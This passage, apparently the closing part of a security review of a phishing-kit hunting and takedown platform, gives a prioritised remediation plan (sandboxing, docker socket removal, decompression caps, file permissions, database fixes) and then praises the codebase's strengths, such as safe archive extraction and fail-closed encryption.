3. Patch `_CHAIN_RE` + add the file-size and time budget (P0-3)
4. Remove `--no-sandbox`; enable unprivileged userns (P0-4)
5. Cap `zlib.decompress`; add `MemoryMax` (P0-5)
6. Remove the docker socket mount and `docker` group membership (P0-2)

**This week**
7. Decide sandbox: build it properly, or update the docs to match reality (P0-2)
8. `kithunt_state` default + `extra_where` guard (P1-6)
9. Fix the systemd units; collapse to one topology (P1-7, P1-8)
10. `db_pool_max` or PgBouncer (P1-9)
11. `idx_takedowns_url_id` (P1-13)
12. Escape the research portal (P1-16); `chmod 600 .env` (P1-17)
13. `uv lock`; turn mypy back on (P1-11, P1-12)

**This month**
14. Worker metrics export (P1-10)
15. N+1 batching + incremental seed (P1-14, P1-15)
16. Self-host certstream + add a zero-feed alarm (P2-21)
17. Fix the takedown channels so the numbers mean something (P1-18, P1-19)
18. Expand exfil coverage — best value-per-hour in the list (P2-22, P2-23)

---

## What's genuinely good

Worth saying, because the report above is unrelentingly negative and the codebase doesn't deserve that impression:

- **`safe_extract.py`** is textbook. Absolute-path rejection, resolved-path escape check, symlink/hardlink/device rejection, *and* re-counting real bytes during extraction rather than trusting declared sizes. Most projects get two of those four.
- **The fail-closed crypto policy** in `crypto.py` — refusing to store rather than degrading to plaintext, with MultiFernet rotation — is the right call and rarely made.
- **`_HostThrottle` reserving its slot before sleeping** is a subtle detail that makes the ethics guarantee actually hold under concurrency. Easy to get wrong; you got it right.
- **The reaper** with poison-row parking, and the partial indexes sized to match its query shape.
- **`verify.py`** — measuring confirmed deaths instead of notices sent is the difference between a demo and a platform. `looks_dead()` being pure and conservative is exactly right.
- **`pivot.py`'s** fan-out caps and weighted edges — you anticipated the "Cloudflare merges the internet into one actor" failure before it bit you.
- **The docstrings.** They explain *why*, including what the previous bug was. That's how the analyzer-sandbox gap became findable at all.

The core problem isn't engineering quality. It's that the security-critical layer — the sandbox — was designed and documented but never wired up, and the rest of the system was built assuming it was there.
